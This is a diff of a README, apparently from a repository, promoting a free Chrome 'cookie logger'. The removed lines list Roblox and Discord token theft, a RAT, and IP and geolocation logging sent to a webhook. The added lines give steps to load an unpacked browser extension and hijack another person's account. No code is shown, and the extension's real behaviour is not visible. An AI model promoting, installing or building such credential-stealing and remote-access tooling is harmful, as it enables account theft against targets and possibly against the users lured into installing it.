@@ -1,30 +1,26 @@
-# This Is The Best Free Cookie Logger That Uses A NEW Glitch In Chrome/Google
+# This Is The Best Free Cookie Logger That Uses A NEW Glitch In Chrome/Google (Only Works On Windows)
 
 ![download](https://user-images.githubusercontent.com/108227869/177584583-e468fb2a-d8c8-4cf8-9d26-0fbc75e3bc6c.gif)
 
 • Make Sure You Install Chrome/Google Either Of Them Work
 
 # STEPS👣 BELOW
-Make Sure You Download These Requirments
-• 
-After Installing The Requirments Go To Download
-Then Once Downloaded Run Open Beam.py
 
+• Download Folder As ZIP
 
-# Features 🛡️
-1; Roblox Cookie Logger
+• Locate The ZIP Folder And Unzip It.
 
-2; Bloxflip Token Logger And RAT
+• Open Chrome/Google And Go To The Extensions Settings (Not The Store).
 
-2; Roblox Info Such As Roblox Friends, Followers, Username And Gamepasses All Sent To Webhook 
+• Make Sure Developer Mode Is Switched ON.
 
-# Extra Features 🛡️🛡️
+• Click Load Unpacked Choose The Folder.
 
-1; Discord Token Logger
+• And You Should See The Extension.
 
-2; Ip Logger
+• Go To Somebodys Profile And Click The Extension You Will See A Gui That Has A Button Which Says REPLACE
+Click It And Wait Around 2 Minutes It Should Be Done.
 
-3; Geolocation (Its Like The Ip Logger But Its Precise To Where It Was Opened)
+• Refresh The Page And Your In Their Account.
 
 # What It Does
-Its a simple gui i made that creates a stub and it steals anybodys chrome, firefox, opera cookies
